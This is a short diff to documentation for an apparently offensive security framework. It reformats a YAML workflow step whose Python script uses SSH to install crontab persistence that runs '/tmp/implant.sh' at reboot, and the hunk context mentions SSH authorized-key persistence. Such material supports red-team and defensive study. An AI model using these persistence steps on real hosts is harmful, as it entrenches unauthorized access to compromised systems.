@@ -46,11 +46,13 @@ for cmd in persistence.ssh_authorized_key("ssh-ed25519 AAAA..."):
 ```yaml
 steps:
   - name: install crontab persistence
-    script: |
-      from ofx.api import persistence
-      from ofx.api.post.runners.ssh import PostSSH
+    module: python
+    with:
+      script: |
+        from ofx.api import persistence
+        from ofx.api.post.runners.ssh import PostSSH
 
-      runner = PostSSH(host="{{ inputs.target }}", user="{{ secrets.user }}")
-      for cmd in persistence.crontab_command("/tmp/implant.sh", schedule="@reboot"):
-          print(runner.run(cmd))
+        runner = PostSSH(host="{{ inputs.target }}", user="{{ secrets.user }}")
+        for cmd in persistence.crontab_command("/tmp/implant.sh", schedule="@reboot"):
+            print(runner.run(cmd))
 ```
